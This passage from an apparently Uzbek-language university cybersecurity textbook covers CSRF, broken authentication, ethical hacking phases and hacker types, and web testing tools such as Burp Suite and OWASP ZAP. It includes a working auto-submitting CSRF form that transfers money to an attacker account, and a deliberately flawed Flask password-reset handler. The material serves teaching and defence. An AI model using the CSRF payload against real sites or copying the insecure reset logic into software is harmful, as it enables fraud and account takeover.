Keyin u havolani ko‘plab bank mijozlariga email orqali tarqatadi. Bank akkauntiga tizimga kirgan holda ushbu havolani bosgan foydalanuvchilar bilib-bilmay $100 miqdoridagi pul o‘tkazmasini boshlab yuboradilar.
Shuni esda tuting: agar bank sayti faqat POST so‘rovlaridan foydalanayotgan bo‘lsa, <a> tegidan foydalangan holda zararli so‘rovni yuborishning imkoni bo‘lmaydi. Biroq, hujumchi <form> tegidan foydalanib, unga avtomatik ishga tushadigan JavaScript qo‘shishi mumkin.
Quyida shunday shakldagi forma misoli keltirilgan:
<body onload="document.forms[0].submit()">
  <form action="http://netbank.com/transfer.do" method="POST">
    <input type="hidden" name="acct" value="AttackerA"/>
    <input type="hidden" name="amount" value="$100"/>
    <input type="submit" value="View my pictures!"/>
  </form>
</body>
Bu forma sahifa yuklanishi bilan avtomatik ravishda bankka soxta pul o‘tkazmasi so‘rovini yuboradi.
Obro‘sizlantirilgan autentifikatsiya zaifligi
Autentifikatsiya (Authentication) nima?
Autentifikatsiya - bu foydalanuvchi yoki mijozning shaxsini tasdiqlash jarayonidir. Internetga ulangan har bir kishi web-saytlardan foydalanishga urinishi mumkin. Shu sababli kuchli autentifikatsiya mexanizmlari web-xavfsizlikni ta’minlashdagi eng muhim mexanizmlaridan biridir.
Autentifikatsiyaning uchta asosiy turi mavjud:
Biladigan biror narsa (Something you know) - masalan, parol yoki xavfsizlik savoliga javob. Bular bilish omillari (knowledge factors) deb ataladi.
Egalik qiladigan biror narsa (Something you have) - masalan, mobil telefon yoki xavfsizlik tokeni. Bular egalik omillari deb ataladi.
Kimligingiz yoki qilgan ishingiz (Something you are or do) - masalan, biometrik ma’lumotlar (barmoq izi, yuzni aniqlash) yoki xulq-atvor shablonlari. Bular biometrik omillar deb ataladi.
Autentifikatsiya mexanizmlari ushbu omillardan bir yoki bir nechtasini tekshirish uchun turli texnologiyalarga tayanadi.
Autentifikatsiya va avtorizatsiya o‘rtasidagi farq nima?
Autentifikatsiya - foydalanuvchining kimligini tasdiqlash jarayoni. Avtorizatsiya - foydalanuvchining tizimda nima qilishga ruxsati borligini aniqlash jarayoni.
Misol: autentifikatsiya “Carlos123” foydalanuvchi nomi bilan kirayotgan odam shu akkauntni yaratgan shaxsning o‘zi ekanligini tekshiradi?
Carlos123 muvaffaqiyatli autentifikatsiya qilingandan so‘ng:
Uning huquqlari (permissions), nima qilishga ruxsat berilganligi esa avtorizatsiyani qilingani belgilaydi.
Masalan: u boshqa foydalanuvchilarning shaxsiy ma’lumotlaridan foydalana olishi mumkinmi? Yoki boshqa foydalanuvchi akkauntini o‘chirishi mumkinmi?
Shunday qilib: Autentifikatsiya = Kim? Avtorizatsiya = Nima qilish mumkin?
Obro‘sizlangan (buzilgan) autentifikatsiya (Broken Authentication)
Broken Authentication - bu API autentifikatsiya mexanizmlari noto‘g‘ri ishlaganda yuzaga keladigan zaiflik bo‘lib, hujumchilarga ruxsatsiz resurslardan foydalanish yoki boshqa foydalanuvchilar nomidan amallarni bajarish imkonini beradi. Bunday zaifliklar quyidagi holatlar natijasida paydo bo‘lishi mumkin:
	•	kuchsiz parol siyosati;
	•	noto‘g‘ri sessiya boshqaruvi;
	•	ko‘p faktorli autentifikatsiyaning yo‘qligi;
	•	foydalanuvchi shaxsini tekshirish jarayonidagi xatolar.
Misol: xavfsiz bo‘lmagan parolni tiklash APIsi
Tasavvur qiling, web-ilova foydalanuvchilarga parollarini tiklash imkonini beradigan APIga ega. Agar bu API parolni tiklashdan oldin foydalanuvchining shaxsini to‘g‘ri tekshirmasa, hujumchi undan foydalanishi mumkin.
Quyida bunday zaiflikning soddalashtirilgan kod misoli keltirilgan:
@app.route('/reset_password', methods=['POST'])
def reset_password():
    user_id = request.form['user_id']
    new_password = request.form['new_password']
# Xavfsiz emas: Parolni qayta tiklashni so‘rayotgan foydalanuvchi to‘g‘ri autentifikatsiya qilinmayapti.
    if not is_authenticated(user_id):
        return "Unauthorized request."
    # Parolni tiklash davom ettirilmoqda.
    update_password(user_id, new_password)
    return "Password reset successful."
Ushbu kodda is_authenticated foydalanuvchini ishonchli tarzda tekshirishi kerak bo‘lsada, u yetarlicha tekshiruv o‘tkazmaydi. Natijada, hujumchi user_id ni bilsa yoki taxmin qilsa, istalgan foydalanuvchining parolini o‘zgartirib yuborishi mumkin.
	SQL injeksiya qanday ishlaydi va u qanday qilib ma’lumotlar bazasidan ruxsatsiz foydalanishni ta’minlashi mumkin?
	•	Stored XSS va Reflected XSS o‘rtasidagi asosiy farqlar nimalardan iborat?
	•	CSRF hujumi qanday amalga oshiriladi va u nimasi bilan xavfli?
	•	Autentifikatsiya va avtorizatsiya o‘rtasidagi farqni misol bilan tushuntiring?
	•	Broken authentication zaifligining asosiy sabablari nimalar va u qanday oqibatlarga olib kelishi mumkin?
	•	API parol tiklash funksiyasida autentifikatsiyani noto‘g‘ri tekshirish qanday xavf tug‘diradi?
Nazorat savollari
	•	SQL injeksiya qanday ishlaydi va u qanday qilib ma’lumotlar bazasidan ruxsatsiz foydalanishni ta’minlashi mumkin?
	•	Stored XSS va Reflected XSS o‘rtasidagi asosiy farqlar nimalardan iborat?
	•	CSRF hujumi qanday amalga oshiriladi va u nimasi bilan xavfli?
	•	Autentifikatsiya va avtorizatsiya o‘rtasidagi farqni misol bilan tushuntiring?
	•	Broken authentication zaifligining asosiy sabablari nimalar va u qanday oqibatlarga olib kelishi mumkin?
	•	API parol tiklash funksiyasida autentifikatsiyani noto‘g‘ri tekshirish qanday xavf tug‘diradi?
Nazorat savollari

5.3. Ethical hacking va qonuniy asoslar  (Ma’ruza mashg‘uloti)
1. Ethical hacking (etik xakerlik) nima?
2. Etik xakerlar turlari?
3. Axloqiy xakerlikda tizim xakerligining asosiy tushunchalari.
Reja:
1. Ethical hacking (etik xakerlik) nima?
2. Etik xakerlar turlari?
3. Axloqiy xakerlikda tizim xakerligining asosiy tushunchalari.
Reja:

Etik (yoki axloqiy) xakerlik (Ethical hacking), tizimda xakerlik qilish, zaifliklarni skanerlash, ruxsatsiz foydalanish, razvedka, imtiyozlarni oshirish, ekspluatatsiya qilish, foydalanishni saqlash, izlarni yashirish, penetratsion test, xavfsizlik vositalari, kriptografiya, etik xakerlik turlari.
Kalit so‘zlar:
Etik (yoki axloqiy) xakerlik (Ethical hacking), tizimda xakerlik qilish, zaifliklarni skanerlash, ruxsatsiz foydalanish, razvedka, imtiyozlarni oshirish, ekspluatatsiya qilish, foydalanishni saqlash, izlarni yashirish, penetratsion test, xavfsizlik vositalari, kriptografiya, etik xakerlik turlari.
Kalit so‘zlar:
Ethical hacking (etik xakerlik) nima?
Etik xakerlik - bu kompyuter tizimlari, tarmoqlar va ilovalarni sinovdan o‘tkazishning qonuniy va professional amaliyotidir. Bu jarayon zararli xakerlar ekspluatatsiya qilmasidan oldin xavfsizlikdagi zaifliklarni aniqlash va ularni bartaraf etish uchun amalga oshiriladi. Unda xakerlik texnikalaridan foydalanilsada, ruxsat asosida va ijobiy maqsadda qo‘llanadi. Undan asosiy maqsad - raqamli aktivlarni himoya qilish va umumiy kiberxavfsizlikni yaxshilashdir (5.4-rasm).

5.4-rasm. Etik xakerlik qanday ishlaydi
Etik xakerlar, ko‘pincha “oq shlyapali xakerlar (white-hat hackers)” deb ataladi, real kiberhujumlarni modellashtira oladigan malakali mutaxassislardir. Ularning vazifasi - hujumchilar kabi fikrlash, haqiqiy tahdidlarni sinab ko‘rish va maxfiy ma’lumotlar hamda infratuzilmaga xavf tug‘dirishi mumkin bo‘lgan zaif nuqtalarni aniqlashdir. Etik xakerlik quyidagi jihatlarda muhim rol o‘ynaydi: 
	•	tashkilotning xavfsizlik darajasini mustahkamlashda;
	•	kiberxavfsizlik standartlariga muvofiqlikni ta’minlashda;
	•	kiberhujumlarga nisbatan barqarorlikni oshirishda;
	•	tizim egasining oldindan ruxsati bilan xakerlik texnikalaridan foydalanish.
Etik xakerlikning asosiy jihatlari
Ushbu jihatlar etik xakerlikning tartibli, qonuniy va kiberxavfsizlikni yaxshilashga yo‘naltirilgan holda amalga oshirilishini ta’minlaydi (5.5-rasm).

5.5-rasm. Etik xakerlikning asosiy jihatlari
Hisobot berish: etik xakerlar sinov natijalarini tashkilotga qaytarib, batafsil hisobot taqdim etadilar.
Ruxsat asosida ishlash: ularning faoliyati jinoyat xakerligidan farqlanishi uchun oldindan ruxsat olinishi shart.
Maqsad: asosiy maqsad - dushman hujumchilar tizimga kira olmasidan avval zaifliklarni topish. Bunga tizim, ilova va tarmoqdagi ekspluatatsiya qilinishi mumkin bo‘lgan zaifliklarni aniqlash kiradi.
Metodologiya: etik xakerlar turli vosita va texnikalardan foydalangan holda bosqichma-bosqich sinov o‘tkazadilar. Bu jarayon dushman xakerlari usullariga o‘xshash bo‘lib, zaifliklarni skanerlash, tizimga kirishga harakat qilish va mavjud himoya nazoratlarini tekshirish kabi bosqichlarni o‘z ichiga oladi.
Etik xakerlikning ahamiyati
Etik xakerlik zamonaviy kiberxavfsizlikka sezilarli hissa qo‘shadi. Etik xakerlar kiberjinoyatchilar qo‘llaydigan strategiya va taktikalarni modellashtirish orqali zaifliklarni ekspluatatsiya qilinishidan oldin aniqlab, ularni bartaraf eta oladilar. Bu proaktiv yondashuv quyidagilarga xizmat qiladi:
Xavfsizlikni kuchaytirish: ma’lumotlar sizib chiqishi va kiberhujumlarning oldini olish uchun xatolik va zaifliklarni aniqlash hamda tuzatish.
Muvofiqlik: sanoat standartlari va me’yoriy talablar belgilagan xavfsizlik talablari bajarilishini ta’minlash.
Xavf boshqaruvi: tashkilot aktivlariga tahdid solishi mumkin bo‘lgan xavflarni baholash va kamaytirish.
Hodisalarga javob berish: kompaniyaning xavfsizlik hodisalariga tezkor javob berish va ulardan tiklana olish qobiliyatini oshirish.
Etik xakerlik turlari
Xavfsizlik sinovining yo‘nalishiga qarab, etik xakerlik bir nechta toifalarga bo‘linadi:
Tarmoqda xakerlik qilish: tarmoq infratuzilmasini sinovdan o‘tkazib, protokollar, sozlamalar va tarmoq qurilmalaridagi zaifliklarni aniqlashni o‘z ichiga oladi.
Web-ilovalarda xakerlik qilish: SQL injection, XSS kabi zaifliklarni aniqlash orqali web-ilovalardagi kamchiliklarni topishga qaratiladi.
Tizimda xakerlik qilish: operatsion tizimlar va dasturlardagi ekspluatatsiya qilinishi mumkin bo‘lgan xavfsizlik nuqsonlarini aniqlashni maqsad qiladi.
Ijtimoiy muhandislik: inson omilini sinash uchun odamlarni maxfiy ma’lumotlarni oshkor qilishga yoki xavfsizlikni buzishi mumkin bo‘lgan harakatlarni bajarishga aldashga urinishdan iborat.
Simsiz tarmoqlarda xakerlik qilish: simsiz aloqa xavfsizligini baholash va ulardagi potentsial tahdidlarni aniqlashni o‘z ichiga oladi.
Etik xakerlari turlari
Etik xakerlik - bu kompyuter yoki tarmoqdagi zaifliklarni aniqlash va mumkin bo‘lgan tahdidlarni topish jarayonidir. Etik xaker kompyuter, web-ilova yoki tarmoqdagi zaif joylarni aniqlab, ular haqida tashkilotga xabar beradi. Xakerlar quyidagi turlarga bo‘linadi:
	•	oq shlyapali xakerlar (White Hat Hackers);
	•	qora shlyapali xakerlar (Black Hat Hackers);
	•	kulrang shlyapali xakerlar (Gray Hat Hackers);
	•	ko‘k shlyapali xakerlar (Blue Hat Hackers);
	•	yashil shlyapali xakerlar (Green Hat Hackers);
	•	qizil shlyapali xakerlar (Red Hat Hackers).
Oq shlyapali xakerlar (White Hat Hackers)
Oq shlyapali xakerlar - bu tizim zaifliklarini sinab ko‘rishga ruxsat berilgan etik xavfsizlik mutaxassislari. Ular tashkilot bilan qonuniy shartnoma asosida ishlaydi.
Ular tashkilotdan maqsadli tizim haqida ma’lumot olib, penetratsion testlar, zaifliklarni skanerlash, xavfsizlik baholash ishlarini olib boradi va natijalarni himoyani kuchaytirish uchun taqdim etadi.
Odatda oq shlyapali xakerlar kompyuter fanlari, axborot texnologiyalari yoki kiberxavfsizlik bo‘yicha bakalavr darajasiga ega bo‘ladi, tarmoqlar, OTlar, dasturlash va xavfsizlik vositalarini biladi, shuningdek CEH, CISSP, OSCP kabi sertifikatlarga ega bo‘ladi.
Misol: 
Bank bir kiberxavfsizlik talabasini yollaydi va onlayn banking ilovasini zaifliklarga test qiladi. 
Ruxsat bilan penetratsion test o‘tkazadi.
Hisob balansini o‘zgartirishga imkon beruvchi xatoni topadi.
Topilgan zaiflikni bankka xabar qiladi va bank uni jinoyatchilar foydalanishidan oldin tuzatadi.
Qora shlyapali xakerlar (Black Hat Hackers)
Ular tashkilot ruxsatisiz harakat qiladi, shuning uchun faoliyati noqonuniy hisoblanadi.
Qora shlyapali xakerlar xavfsizlik zaifliklaridan foydalanib, saytlar, tizimlar yoki administrator panellariga noqonuniy ravishda kiradi. Ularning maqsadi - oqibatlarga e’tibor qilmasdan shaxsiy foyda ko‘rish yoki kuchga ega bo‘lish.
Ular tizim funksiyalarini buzishi, ma’lumotlarni o‘chirishi yoki xizmatlarni ishdan chiqarishi mumkin, natijada katta moliyaviy va operatsion zarar kelib chiqadi.
Bu kabi harakatlar jinoyat hisoblanadi va jarima, qamoq hamda obro‘ga doimiy putur yetkazadi.
Misol:
Xaker yashirin ravishda elektron savdo saytining bazasiga kiradi. Mijozlarning kredit karta ma’lumotlarini o‘g‘irlaydi. Ularni darkwebda sotadi. Kompaniyaga katta moliyaviy zarar yetkazadi.
Kulrang shlyapali xakerlar (Gray Hat Hackers)
Ba’zan ruxsatsiz tizimlarga kiradi va qonunlarni buzadi, lekin qora shlyapalardek zarar yetkazish niyati bo‘lmaydi. Ular ko‘pincha tizimdagi xatolarni topib yordam bermoqchi bo‘ladi, biroq ruxsatsiz harakatlari baribir muammolar keltirib chiqarishi mumkin (xizmatlar ishdan chiqishi, maxfiy ma’lumotlarning oshkor bo‘lishi yoki boshqa xakerlar foydalanishi uchun imkoniyat yaratishi mumkin).
Bunday xatti-harakatlar tashkilot faoliyatiga zarar yetkazishi yoki moliyaviy yo‘qotishlarga sabab bo‘lishi mumkin.
Misol:
Talaba universitet portalidagi zaiflikni topadi. Lekin, bu haqida IT bo‘limiga xabar berish o‘rniga, uni ijtimoiy tarmoqlarda e’lon qiladi.
U hech qanday ma’lumotni o‘g‘irlamagan, ammo uning e’loni boshqa qora shlyapali xakerlar uchun imkon yaratadi.
Ko‘k shlyapali xakerlar (Blue Hat Hackers)
Ular ko‘pincha yangi boshlovchi bo‘lib, tayyor vositalardan foydalanadi. Ularning motivi - kimdir ularni xafa qilgani yoki ularga qarshi chiqqani uchun shaxsiy qasos olish. Ko‘k shlyapali xakerlar professional o‘sishga emas, balki shaxsiy g‘azabni bosishga e’tibor qaratadi.
Misol: geymer onlayn o‘yinda mag‘lub bo‘ladi va raqibi uni masxara qiladi. Shundan so‘ng u internetdan oddiy DDoS vositasini yuklab olib, raqibining serverini vaqtincha ishdan chiqaradi.
Yashil shlyapali xakerlar (Green Hat Hackers)
Ular yangi boshlovchi bo‘lsada, xakerlikni o‘rganishga juda qiziqadi. Tajribali xakerlardan o‘rganadi. Savollar beradi, texnikalarni o‘rganadi. Kelajakda professional xaker bo‘lishni maqsad qiladi.
Misol: yangi boshlovchi onlayn xakerlik forumiga qo‘shiladi, penetratsion test bo‘yicha savollar beradi va test saytlarida qonuniy tajriba o‘tkazib ko‘nikmalarini oshiradi.
Qizil shlyapali xakerlar (Red Hat Hackers)
Ular “burgut ko‘zli xakerlar” deb ataladi. Maqsadlari oq shlyapali xakerlarga o‘xshash - qora shlyapalarni to‘xtatish. Biroq, ular agressiv usullar qo‘llaydi va ko‘pincha standart etik xakerlik qoidalaridan tashqariga chiqadi.
Ular qora shlyapa xakerlar tizimiga qarshi shiddatli hujum uyushtirib, ularning kompyuterini butunlay ishdan chiqarishi yoki qayta tiklanmas holga keltirishi mumkin.
Misol: Qora shlyapali xaker kompaniya bazasiga kirishga urinadi. Qizil shlyapali xaker esa: hujumni aniqlaydi, qora shlyapaning kompyuteriga qarshi hujum qiladi, uning fayllari va operatsion tizimini buzib tashlaydi, natijada qora shlyapa yangi kompyuter sotib olmaguncha davom eta olmaydi.
Axloqiy xakerlikda tizim xakerligining asosiy tushunchalari
Tizimda xakerlik qilish (System Hacking) - bu maqsadli tizimdagi zaifliklarni qidirish va ulardan foydalanib, ruxsatsiz foydalanish, imtiyozlarni oshirish, ma’lumotlarni buzish yoki o‘g‘irlashga qaratilgan faoliyatdir. Etik xakerlar bu faoliyatni haqiqiy hujumlarni modellashtirish va kompaniyalarga o‘z himoyalarini mustahkamlashda yordam berish uchun amalga oshiradi.
Tizimda xakerlik qilish bosqichlari
Tizimda xakerlik qilish odatda tartibli tarzda, etik xakerlik hayot aylanishiga mos ravishda amalga oshiriladi. Eng muhim bosqichlar:
1. Razvedka (Reconnaissance)
Maqsad tizim haqida ma’lumot to‘plash (masalan: IP manzillar, operatsion tizimlar, ochiq portlar). Bunda Nmap, Whois, Google Dorks kabi vositalardan foydalaniladi.
2. Skanerlash (Scanning)
Tizimdagi zaifliklarni aniqlash (masalan: ochiq portlar, xizmatlar, noto‘g‘ri sozlamalar). Buning uchun Nessus, OpenVAS, Nikto kabi vositalardan foydalanadi.
3. Kirish huquqini qo‘lga kiritish (Gaining Access)
Zaifliklardan foydalanib tizimga noqonuniy kiriladi. Buning uchun parol buzish, dasturiy zaifliklarni ekspluatatsiya qilish, ijtimoiy muhandislik kabi usullardan foydalanadi.
4. Kirishni saqlab qolish (Maintaining Access)
Tizimdan uzoq muddatli foydalanishni ta’minlash (masalan: backdoor, rootkit o‘rnatish). Buning uchun Metasploit, Netcat kabi vositalardan foydalanadi.
5. Izlarni yashirish (Clearing Tracks)
Aniqlanmaslik uchun hujum izlarini o‘chirish amalga oshiriladi. Buning uchun Loglarni o‘chirish, vaqt tamg‘alarini o‘zgartirish kabi ishlab bajariladi.
Etik xakerlik bosqichlari
Etik xakerlik odatda quyidagi asosiy bosqichlardan iborat:
	•	Tayyorlanish va rejalashtirish: sinov chegaralarini belgilash, ruxsat olish va maqsad tizim haqida dastlabki ma’lumotlarni yig‘ish.
	•	Razvedka: tarmoq tuzilishi, IP manzillar va xavfsizlik zaifliklari haqida chuqur ma’lumot yig‘ish.
	•	Skanerlash: zaif xizmatlar, ochiq portlar va ekspluatatsiya mumkin bo‘lgan joylarni aniqlash uchun skanerlash vositalaridan foydalanish.
	•	Kirish: aniqlangan zaifliklardan foydalanib, haqiqiy hujumlarni modellashtirish orqali tizimga kirishni sinab ko‘rish.
	•	Kirishni saqlash: hujumchi tizimda qancha vaqt qolishi mumkinligini baholash va barqaror kirish mexanizmlarini tekshirish.
	•	Hisobot va tahlil: topilgan zaifliklar haqida batafsil hisobot tayyorlash va ularni bartaraf etish bo‘yicha tavsiyalar berish.
Etik xaker bo‘lish uchun talab qilinadigan ko‘nikmalar
Etik xaker kompyuter tizimlari bilan samarali ishlash uchun quyidagi asosiy texnik (“hard”) ko‘nikmalarga ega bo‘lishi kerak:
Tarmoq bo‘yicha bilimlar: tarmoqlar qanday ishlashini chuqur tushunish muhim. TCP/IP, DNS, HTTP kabi protokollar, router, switch, firewall kabi qurilmalar, tarmoq trafikini tahlil qilish usullari shu jumlaga kiradi.
Operatsion tizimlar bo‘yicha bilim: bir nechta OTda, ayniqsa Linuxda yuqori darajada tajriba zarur. Shuningdek, Windows va macOS tizimlaridagi zaifliklarni aniqlash uchun ham yetarli bilim talab etiladi.
Dasturlash va skript tuzish: dastur ishlab chiqish shart emas, ammo Python, C++, Java kabi tillarni tushunish juda muhim. Bash, Perl kabi skript tillari avtomatlashtirish va kod tahlili uchun qo‘l keladi.
Ma’lumotlar bazasi boshqaruvi: DBMS (masalan, SQL) bo‘yicha bilim zarur. SQL injection kabi zaifliklarni aniqlash va oldini olishni bilish talab etiladi.
Kriptografiya: shifrlash va deshifrlash usullarini bilish parollarni buzish, ma’lumot almashinuvini tahlil qilish va aloqa xavfsizligini baholash uchun muhim.
Web-ilova xavfsizligi: ko‘pchilik xizmatlar webga asoslanganligi sababli, OWASP Top 10 (keyingi mavzularda bu haqida to‘xtalib o‘tiladi)da keltirilgan umumiy zaifliklarni aniqlashni bilish zarur. HTML, JavaScript, API va HTTP protokollari bilan ishlashni tushunish kerak.
Xavfsizlik vositalarini bilish: penetratsion test vositalari - Nmap, Wireshark, Metasploit va boshqa ko‘plab vositalarni mukammal bilish.
Bulut xavfsizligi: kompaniyalar bulutga o‘tayotgani sababli, bulut xavfsizligi tamoyillari va potentsial zaifliklarni bilish tobora muhim bo‘lib bormoqda.
Tizimda xakerlik qilish nima va etik xakerlar undan qanday maqsadlarda foydalanadi?
	•	System Hacking jarayonining asosiy bosqichlari qaysilar va har birining vazifasi nimadan iborat?
	•	Razvedka bosqichida qanday ma’lumotlar yig‘iladi va bu jarayonda qaysi vositalar ishlatiladi?
	•	Zaifliklarni skanerlash nima va u qanday vositalar orqali amalga oshiriladi?
	•	Etik xaker tizimga kirishni qanday usullar orqali qo‘lga kiritishi mumkin?
	•	Foydalanishni saqlab qolish nima uchun amalga oshiriladi?
	•	Etik xakerlikning afzalliklari nimalardan iborat?
	•	Etik xaker bo‘lish uchun qaysi texnik ko‘nikmalar (hard skills) muhim hisoblanadi?
	•	Etik xakerlarning turlarini, etik xakerlik turlarini ayting?
	•	 Etik xakerlik nima, nima uchun talab etiladi?
Nazorat savollari
	•	Tizimda xakerlik qilish nima va etik xakerlar undan qanday maqsadlarda foydalanadi?
	•	System Hacking jarayonining asosiy bosqichlari qaysilar va har birining vazifasi nimadan iborat?
	•	Razvedka bosqichida qanday ma’lumotlar yig‘iladi va bu jarayonda qaysi vositalar ishlatiladi?
	•	Zaifliklarni skanerlash nima va u qanday vositalar orqali amalga oshiriladi?
	•	Etik xaker tizimga kirishni qanday usullar orqali qo‘lga kiritishi mumkin?
	•	Foydalanishni saqlab qolish nima uchun amalga oshiriladi?
	•	Etik xakerlikning afzalliklari nimalardan iborat?
	•	Etik xaker bo‘lish uchun qaysi texnik ko‘nikmalar (hard skills) muhim hisoblanadi?
	•	Etik xakerlarning turlarini, etik xakerlik turlarini ayting?
	•	 Etik xakerlik nima, nima uchun talab etiladi?
Nazorat savollari
5.4. Websayt xavfsizligi vositalari  (Ma’ruza mashg‘uloti)
1. Burp Suite vositasi.
2. OWASP ZAP vositasi.
3. Wappalyzer vositasi.
Reja:
1. Burp Suite vositasi.
2. OWASP ZAP vositasi.
3. Wappalyzer vositasi.
Reja:

Burp Suite, OWASP ZAP, Wappalyzer, proxy, aktiv skanerlash, passiv skanerlash, texnologiyalarni aniqlash, zaifliklarni aniqlash.
Kalit so‘zlar:
Burp Suite, OWASP ZAP, Wappalyzer, proxy, aktiv skanerlash, passiv skanerlash, texnologiyalarni aniqlash, zaifliklarni aniqlash.
Kalit so‘zlar:
Burp Suite vositasi
Burp yoki Burp Suite - bu web-ilovalarni pentest qilish (kirish sinovlari) uchun ishlatiladigan vositalar to‘plamidir. Uni Portswigger nomli kompaniya ishlab chiqqan, bu kompaniya uning asoschisi Dafydd Stuttardning taxallusi ham hisoblanadi. BurpSuite “barchasi bir joyda” tamoyiliga asoslangan vositalar majmuasi bo‘lib, uning imkoniyatlarini BApp deb ataluvchi qo‘shimcha plaginlar o‘rnatish orqali kengaytirish mumkin. Bu vosita professional web-ilova xavfsizligi tadqiqotchilari va zaiflik (bug bounty) ovchilari orasida eng mashhur vositadir. Foydalanish qulayligi uni OWASP ZAP (quyida bu haqida to‘xtalib o‘tiladi) kabi bepul alternativalarga nisbatan yanada ma’qul tanlovga aylantiradi (5.6-rasm).
Burp Suite quyidagi versiyalarda mavjud:
	•	Community Edition – bepul;
	•	Professional Edition - $399/yil;
	•	Enterprise Edition - $3999/yil.

5.6-rasm. BurpSuite ilovasining umumiy ko‘rinishi
Ushbu mavzuda BurpSuite taqdim etadigan vositalar haqida qisqacha ma’lumot beriladi. BurpSuite tomonidan taqdim etiladigan vositalar quyidagilardan iborat:
Dashboard – Dashboard yorlig‘i loyihangizdagi avtomatlashtirilgan vazifalarni, masalan, zaifliklarni skanerlash yoki “live” vazifalarni monitoring qilish va boshqarish uchun markaziy joyni taqdim etadi.
Target – bu vosita nishon ilovalar haqidagi batafsil ma’lumotlarni o‘z ichiga oladi va zaifliklarni sinash jarayonini boshqarish imkonini beradi.
Burp's browser – bu brauzer Burp Suitening barcha funksiyalari bilan avtomatik ishlash uchun oldindan sozlangan.
Proxy – bu web-proksi vositasi brauzer va nishon web-ilova o‘rtasida “o‘rtaga turgan odam” sifatida ishlaydi. U yuborilayotgan va qaytayotgan xom (raw) trafikni ushlash, ko‘rish va o‘zgartirish imkonini beradi.
Scanner (Professional versiyada) – bu web-zaifliklarni aniqlash uchun mo‘ljallangan ilg‘or skaner bo‘lib, avtomatik tarzda kontentni tekshirib (crawl) va turli zaifliklar uchun audit o‘tkazadi.
Intruder – web-ilovalarga qarshi avtomatlashtirilgan, maxsus sozlanadigan hujumlarni amalga oshirish uchun kuchli vosita. Juda moslashuvchan bo‘lib, test jarayonini tezlashtirish va samarali qilish uchun keng ko‘lamdagi vazifalarni bajaradi.
Repeater – bu vosita alohida xabarlarni qo‘lda o‘zgartirish va qayta yuborish, shuningdek ilovaning javoblarini tahlil qilish uchun ishlatiladi.
Sequencer – ilovaning sessiya tokenlari yoki boshqa tasodifiy bo‘lishi kerak bo‘lgan ma’lumotlardagi tasodifiylik sifatini tahlil qilish uchun mo‘ljallangan murakkab vosita.
Decoder – ilova ma’lumotlarini qo‘lda yoki avtomatik ravishda dekodlash va kodlash uchun foydali vosita.
Comparer – har qanday ikki ma’lumot elementini, masalan, o‘xshash HTTP xabarlarini vizual tarzda solishtirish (“diff”) uchun qulay vosita.
Logger – Burp Suite tomonidan yaratilgan HTTP trafikni yozib borish va tahlil qilish vositasi.
Inspector – HTTP va WebSockets xabarlarini tahlil qilish va tahrirlash uchun yordam beruvchi imkoniyatlarni taqdim etadi.
Collaborator (Professional versiyada) – tarmoqqa bog‘liq bo‘lmagan (out-of-band) zaifliklarni aniqlash uchun qo‘lda ishlatiladigan vosita.
DOM Invader – DOM XSS zaifliklarini topish uchun ishlatiladigan vosita.
Clickbandit – Clickjacking hujumlarini yaratish uchun vosita.
Message editor – Burp bo‘ylab HTTP so‘rov va javoblarni ko‘rish hamda tahrirlash uchun ishlatiladigan vosita.
Engagement tools (Professional) – turli loyiha bilan bog‘liq (engagement) vazifalarni sozlash imkonini beradi.
Search – Burp Suite ichida qidiruv amalga oshirish uchun vosita.
Command palette – buyruqlarni tez topish va klaviatura orqali bajarish uchun vosita.
Infiltrator – Burpdan yuborilayotgan kirish ma’lumotlari xavfli APIlarga uzatilayotganini aniqlash uchun vosita.
Organizer – keyinchalik tahlil qilish uchun saqlamoqchi bo‘lgan HTTP xabarlarini jamlash va izoh qo‘shish imkonini beruvchi vosita.
Context menu – Burp Suite bo‘ylab turli funksiyalar va vositalarga tezkor kirish imkonini beradi.
Filter settings – Burp Suite vositalarida ko‘rsatiladigan xabarlarni saralash (filtrlash) imkonini beruvchi sozlamalar.
OWASP ZAP vositasi
OWASP ZAP — ochiq manbali (open-source) penetratsion testlash vositasi bo‘lib, AppSec mutaxassislariga ma’lum va noma’lum kiber tahdidlarni aniqlashda yordam beradi. Asosan web-ilovalar uchun qo‘llaniladi va har xil kiber tahdidlarni tezda aniqlash imkonini beruvchi keng funksional imkoniyatlarga ega. Ushbu imkoniyatlarga quyidagilar kiradi:
	•	web-so‘rovlarga passiv skanerlashni amalga oshirish;
	•	serverdagi fayl va papkalarni skanerlash uchun lug‘at (dictionary) ro‘yxatidan foydalanish;
	•	sayt tuzilmasini to‘liq tushunish va shubhali havolalarni/URLlarni topish uchun takomillashgan tekshirish (crawling) mexanizmini ishga tushirish;
	•	web-ilovalar va brauzerlar o‘rtasida almashinayotgan web-so‘rovlarga to‘liq nazorat o‘rnatish.
Ushbu imkoniyatlar orqali OWASP ZAP eng xavfli web-hujumlarni aniqlashda to‘g‘ri tanlov hisoblanadi.  Masalan: XSS, buzilgan autentifikatsiya, SQL inyeksiya, maxfiy ma’lumotlarning oshkor bo‘lishi va boshqalar.
ZAP qanday ishlaydi?
ZAPning asosiy vazifasi - serverlar va brauzerlar o‘rtasida almashinayotgan barcha web-so‘rovlarni kuzatish va skanerlashdir. U ushbu web-so‘rovlarni ushlab qoladi, tahlil qiladi va skanerlashdan o‘tkazadi, shunda zararli elementlarni erta bosqichda aniqlab, oldini olish mumkin bo‘ladi (5.7-rasm).
Proksi-serverlar qanday ishlashiga juda o‘xshash tarzda, ZAP ham ilova va test vositasi o‘rtasida vositachi sifatida joylashadi. Bu shuni anglatadiki, u barcha web-so‘rovlarni avval o‘zi qabul qiladi. Biroq, an’anaviy proksi-server IP manzilni o‘zgartirsa, ZAP esa web-so‘rovlarni tekshiradi va tahlil qiladi.

5.7-rasm. OWASP ZAP ilovasining asosiy oynasining ko‘rinishi
Skanerning asosiy tushunchalari va xususiyatlari
OWASP ZAPni yuklab olishdan oldin, ushbu vosita taqdim etadigan asosiy tushuncha va imkoniyatlar bilan tanishib chiqish qat’iy tavsiya qilinadi. Quyidagi bandlar ularni yaxshiroq tushunishga yordam beradi.
Faol va passiv skanerlash
ZAP zaifliklarni tez aniqlash uchun ushbu ikki turdagi skanerlashni uzluksiz bajaradi.
Active (Faol): bu skaner belgilangan (predefined) tahdidlar ro‘yxatidan foydalanadi va web-so‘rovlarni shu zaifliklarning belgilari asosida skanerlaydi. Foydalanilgan metodologiya yaxshi bo‘lsada, ilova mantiqiga oid xavflarni aniqlamaydi.
